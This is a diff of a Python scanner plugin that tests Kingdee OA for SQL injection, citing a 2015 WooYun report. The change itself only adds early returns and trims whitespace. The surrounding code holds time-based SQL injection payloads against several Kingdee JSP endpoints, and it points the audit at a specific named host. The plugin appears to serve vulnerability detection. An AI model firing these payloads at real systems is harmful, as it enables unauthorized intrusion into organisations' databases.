@@ -1,5 +1,5 @@
-#!/usr/bin/evn  python 
-#-*-:coding:utf-8:-*-  
+#!/usr/bin/evn  python
+#-*-:coding:utf-8:-*-
 #refer:#http://www.wooyun.org/bugs/wooyun-2015-0136918
 import re,urlparse,time
 
@@ -16,6 +16,7 @@ def audit(arg):
         code ,head,res,body,_ = curl.curl(url)
         if code == 200 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
             security_hole(url)
+            return arg
 
 
     payload1="kingdee/person/note/note_opinion_submit.jsp?opinion_id=1"
@@ -29,7 +30,8 @@ def audit(arg):
     end=time.time()
     if code1!=0 and code2!=0 and 4.6<(end-start2)-(start2-start1):
         security_hole(url)
-        
+        return arg
+
     start1=time.time()
     payload2="kingdee/pubinfo/chatlog_length.jsp?user_id=1&sendid=11%27))%20and%20A.sendid=1"
     url=arg+payload2
@@ -41,7 +43,8 @@ def audit(arg):
     end=time.time()
     if code1!=0 and code2!=0 and 4.6<(end-start2)-(start2-start1):
         security_hole(url)
-        
+        return arg
+
     start1=time.time()
     payload3="kingdee/pubinfo/chatlog_content.jsp?user_id=1&sendid=11%27))%20and%20A.sendid=1"
     url=arg+payload3
@@ -53,7 +56,8 @@ def audit(arg):
     end=time.time()
     if code1!=0 and code2!=0 and 4.6<(end-start2)-(start2-start1):
         security_hole(url)
-        
+        return arg
+
     start1=time.time()
     payload4="kingdee/pubinfo/news_comment_del.jsp?id=1"
     url=arg+payload4
@@ -65,7 +69,8 @@ def audit(arg):
     end=time.time()
     if code1!=0 and code2!=0 and 4.6<(end-start2)-(start2-start1):
         security_hole(url)
+        return arg
 
-if  __name__ == '__main__': 
+if  __name__ == '__main__':
     from dummy import *
     audit(assign('kingdee_oa','http://oa.guanhao.com:8080/')[1])
